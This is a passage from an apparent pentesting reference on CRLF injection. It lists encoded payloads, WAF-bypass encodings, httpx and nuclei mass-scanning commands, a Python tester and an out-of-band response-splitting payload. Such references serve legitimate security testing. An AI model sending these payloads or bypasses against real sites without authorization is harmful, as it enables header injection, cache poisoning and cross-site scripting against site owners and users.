%E5%98%8A%E5%98%8D
```

### Context-Specific Set

**URL-encoded for query parameters:**
```
%0D%0A
%250D%250A
```

**For JSON bodies:**
```
\r\n
\u000d\u000a
```

**For XML bodies:**
```
&#13;&#10;
```

**For base64 contexts:**
```
# Inject raw CRLF, then base64-encode the entire payload
# The decoded output will contain CRLF
```

---

## WAF Bypasses

### Encoding Bypasses

| Technique | Example | When It Works |
|-----------|---------|---------------|
| Double URL encode | `%250D%250A` | WAF decodes once, app decodes twice |
| Unicode UTF-8 | `%E5%98%8A` | Firefox cookie contexts, legacy parsers |
| HTML entities | `&#13;&#10;` | XML/HTML reflection contexts |
| JSON escape | `\r\n` | JSON APIs that parse then reflect |
| Mixed case | `%0d%0a` | Case-sensitive WAF rules |
| Tab padding | `%0D%0A%09` | WAF regex doesn't account for tabs |

### Case Variations

```
%0d%0a
%0D%0A
%0d%0A
%0D%0a
```

### Header Folding Bypass

```
%0D%0A%20X-Header:%20value
%0D%0A%09X-Header:%20value
```

Some WAFs inspect only the first line of a folded header.

### Comment Bypass

Some legacy systems support HTTP comments (rare):
```
%0D%0A(%0D%0A)%0D%0A
```

### Null Byte Truncation

```
%00%0D%0A
```

WAF regex may stop at NUL, missing the CRLF.

---

## Detection Techniques

### Manual Detection

1. **Header Reflection Test**:
   ```
   GET /?lang=en%0D%0AX-Detect: 1 HTTP/1.1
   ```
   Look for `X-Detect: 1` in response headers.

2. **Response Time Analysis**:
   If response splitting occurs, some servers show timing anomalies.

3. **Body Truncation Test**:
   ```
   GET /?lang=en%0D%0AContent-Length: 0%0D%0A%0D%0A HTTP/1.1
   ```
   Check if body is empty or if subsequent bytes are ignored.

### Automated Detection

**Using httpx for mass detection:**
```bash
cat targets.txt | httpx -path "/redirect?url=%0D%0AX-Detect:1" -mr "X-Detect" -o crlf_results.txt
```

**Using nuclei:**
```bash
nuclei -l targets.txt -t http/vulnerabilities/crlf/ -severity high,critical
```

**Using custom interceptor:**
```python
import asyncio
import aiohttp

async def test_crlf(session, url, param):
    payload = "%0D%0AX-Detect: 1"
    test_url = f"{url}?{param}={payload}"
    async with session.get(test_url) as resp:
        text = await resp.text()
        if "X-Detect" in str(resp.headers):
            print(f"[CRLF] {test_url}")

# Run with asyncio
```

### Out-of-Band Detection

For blind CRLF (where headers aren't visible):
```
%0D%0AContent-Length: 0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0A%0D%0A%3Cimg%20src=%22https://your-oast.me%22%3E
```

Use Interactsh or Burp Collaborator to detect DNS/HTTP callbacks from the injected response body.

---

## References

### Official Specifications
- RFC 7230 — HTTP/1.1: Message Syntax and Routing
- RFC 7231 — HTTP/1.1: Semantics and Content
- RFC 7234 — HTTP/1.1: Caching
- RFC 7540 — HTTP/2
- RFC 9113 — HTTP/2 (updated)

### OWASP Resources
- OWASP Testing Guide: Testing for HTTP Splitting/Smuggling (OTG-INPVAL-016)
- CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')

### Research Papers & Blogs
- PortSwigger Web Security Academy: CRLF Injection Labs
- PortSwigger Research: "Practical Web Cache Poisoning" (James Kettle, 2018)
- PortSwigger Research: "Web Cache Entanglement" (James Kettle, 2020)
- PortSwigger Research: "HTTP Desync Attacks: Request Smuggling Reborn" (James Kettle, 2019)
- PortSwigger Research: "Browser-Powered Desync Attacks" (James Kettle, 2022)
- PortSwigger Research: "HTTP/1 Must Die" (James Kettle)
- PortSwigger Research: "Hidden OAuth Attack Vectors"

### GitHub Repositories
- swisskyrepo/PayloadsAllTheThings — CRLF Injection payloads
- payloadbox/crlf-injection-payload-list
- 0xspade/bugbounty — CRLF resources
- PortSwigger/http-request-smuggler
- PortSwigger/param-miner
- defparam/smuggler

### Tools & Frameworks
- ProjectDiscovery: nuclei, httpx, katana, subfinder, interactsh
- Burp Suite Professional (with extensions)
- OWASP ZAP

### Bug Bounty Writeups
- Starbucks CRLF + XSS (Bobrov, 2016)
- Twitter CRLF to XSS (2015)
- Various HackerOne/Bugcrowd disclosures on redirect parameter CRLF

### Educational Platforms
- HackTricks: CRLF (%0D%0A) Injection
- MDN Web Docs: HTTP Headers, Caching, Set-Cookie, Status Codes

---

> **Disclaimer**: This knowledgebase is for authorized security testing and educational purposes only. Always obtain proper authorization before testing systems you do not own. The techniques described can cause significant security impact if used maliciously.
